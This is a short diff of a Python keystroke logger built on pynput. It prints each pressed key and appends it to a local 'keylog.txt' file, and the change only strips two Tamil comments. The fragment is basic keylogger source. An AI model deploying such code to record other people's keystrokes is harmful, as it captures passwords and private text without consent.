@@ -1,9 +1,8 @@
 from pynput.keyboard import Key, Listener
 
 def on_press(key):
-    print(key)  # Screen-ல காட்டு
+    print(key)
     
-    # File-ல save பண்ணு
     with open("keylog.txt", "a") as f:
         f.write(str(key) + "\n")
 
